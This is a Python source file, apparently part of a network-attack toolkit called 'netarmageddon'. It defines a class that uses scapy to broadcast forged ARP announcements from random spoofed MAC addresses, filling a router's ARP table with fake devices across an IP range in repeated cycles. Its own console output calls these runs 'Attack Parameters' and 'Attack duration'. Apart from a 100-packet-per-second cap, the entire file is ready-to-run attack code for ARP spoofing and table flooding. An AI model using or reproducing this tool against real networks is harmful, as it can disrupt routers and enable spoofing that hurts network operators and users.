import random
import re
import sys
import threading
import time
from typing import Optional

from scapy.all import sendp
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet
from scapy.arch import get_if_list

from netarmageddon.utils.output_manager import HEAD, INFO, DEBUG, WARNING, ERROR, CMD, CLEAR


class ARPKeepAlive:
    """Maintain fake devices in router's ARP table"""

    MAX_PPS: int = 100  # Safety limit for packets per second

    def __init__(
        self,
        interface: str,
        base_ip: str,
        num_devices: int = 50,
        mac_prefix: str = "de:ad:00",
        interval: float = 5.0,
        cycles: int = 1,
    ):
        self.interface = interface
        self.base_ip = base_ip
        self.num_devices = num_devices
        self.mac_prefix = mac_prefix
        self.interval = interval
        self.cycles = cycles
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self._stopped = False
        self.start_time = time.time()

        self._validate_interface()
        self._validate_ip()
        self._validate_mac_prefix()

        HEAD("ARP Keep-Alive Configuration")
        CMD(f"┣ Interface: {interface}")
        CMD(f"┣ Base IP: {base_ip}")
        CMD(f"┣ Devices: {num_devices}")
        CMD(f"┗ MAC Prefix: {mac_prefix}")

    def _validate_interface(self) -> None:
        """Verify network interface exists"""
        DEBUG(f"Validating interface: {self.interface}")
        if self.interface not in get_if_list():
            ERROR(f"Interface {self.interface} not found!")
            CMD(f"Available interfaces: {', '.join(get_if_list())}")
            raise ValueError(f"Interface '{self.interface}' not found")
        INFO("Network interface validated")

    def _validate_ip(self) -> None:
        """Validate base IP format"""
        DEBUG(f"Validating base IP: {self.base_ip}")
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.$", self.base_ip):
            ERROR(f"Invalid base IP format: {self.base_ip}")
            raise ValueError("Use format like '192.168.1.'")
        INFO("IP validation passed")

    def _validate_mac_prefix(self) -> None:
        """Validate MAC prefix format"""
        DEBUG(f"Validating MAC prefix: {self.mac_prefix}")
        if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
            ERROR(f"Invalid MAC prefix: {self.mac_prefix}")
            raise ValueError("Use format like 'de:ad:00'")
        INFO("MAC prefix validation passed")

    def _rate_limit(self, pps: int) -> int:
        """Enforce packets-per-second safety limit"""
        if pps > self.MAX_PPS:
            WARNING(f"Rate limited {pps} → {self.MAX_PPS} (safety threshold)")
            return self.MAX_PPS
        return pps

    def _generate_mac(self, ip_suffix: int) -> str:
        """Generate deterministic MAC based on IP suffix"""
        mac = (
            f"{self.mac_prefix}:"
            f"{ip_suffix:02x}:"
            f"{random.randint(0, 0xff):02x}:"
            f"{random.randint(0, 0xff):02x}"
        )
        DEBUG(f"Generated MAC for IP suffix {ip_suffix}: {mac}")
        return mac

    def _generate_arp_packet(self, ip_suffix: int) -> Packet:
        """Create ARP announcement packet"""
        ip = f"{self.base_ip}{ip_suffix}"
        mac = self._generate_mac(ip_suffix)
        DEBUG(f"Constructing ARP packet for {ip} ({mac})")
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)

    def _send_arp_announcements(self) -> None:
        """Main ARP sending loop with rate limiting"""
        try:
            INFO("Starting ARP sequence")
            pps = max(1, self.num_devices)
            allowed_pps = self._rate_limit(pps)
            delay = 1.0 / allowed_pps if allowed_pps > 0 else 0

            HEAD("Attack Parameters")
            CMD(f"┣ Target devices: {self.num_devices}")
            CMD(f"┣ Packet rate: {allowed_pps}/sec")
            CMD(f"┗ Total cycles: {self.cycles}")

            for cycle in range(1, self.cycles + 1):
                if not self.running:
                    break

                CMD(f"Starting cycle {cycle}/{self.cycles}")
                for i in range(1, self.num_devices + 1):
                    if not self.running:
                        break

                    pkt = self._generate_arp_packet(i)
                    try:
                        sendp(pkt, iface=self.interface, verbose=False)
                        CLEAR()
                        INFO(f"Progress: {i}/{self.num_devices} (Cycle {cycle})")
                        DEBUG(f"Sent ARP for {pkt.psrc} ({pkt.src})")
                    except PermissionError as e:
                        ERROR(f"Permission error: {e}")
                        self.stop()
                        return
                    time.sleep(delay)

                if cycle < self.cycles and self.running:
                    INFO(f"Cycle {cycle} completed - Waiting {self.interval}s")
                    time.sleep(self.interval)

        finally:
            self.stop()

    def start(self) -> None:
        """Start ARP maintenance thread"""
        if not self.running:
            DEBUG("Spawning ARP thread")
            self.running = True
            self.thread = threading.Thread(
                target=self._send_arp_announcements, name="ARPKeepAliveThread"
            )
            self.thread.start()
            CMD("🚀 ARP keep-alive started")

    def stop(self) -> None:
        """Stop ARP maintenance safely"""
        if not self.running and self._stopped:
            return

        DEBUG("Initiating ARP shutdown")
        self.running = False

        if self.thread and self.thread.is_alive():
            if threading.current_thread() is not self.thread:
                self.thread.join(timeout=5)
                if self.thread.is_alive():
                    WARNING("ARP thread termination delayed")

        if sys.stdout.isatty():
            CLEAR()

        duration = time.time() - self.start_time
        CMD(f"Attack duration: {duration:.1f}s")
        CMD("✔ ARP maintenance stopped")
        self._stopped = True

    def user_abort(self) -> None:
        """Handle graceful shutdown from SIGINT"""
        CLEAR()
        WARNING("User requested ARP stop")
        self.stop()

    def __enter__(self) -> "ARPKeepAlive":
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        if not self._stopped:
            self.stop()
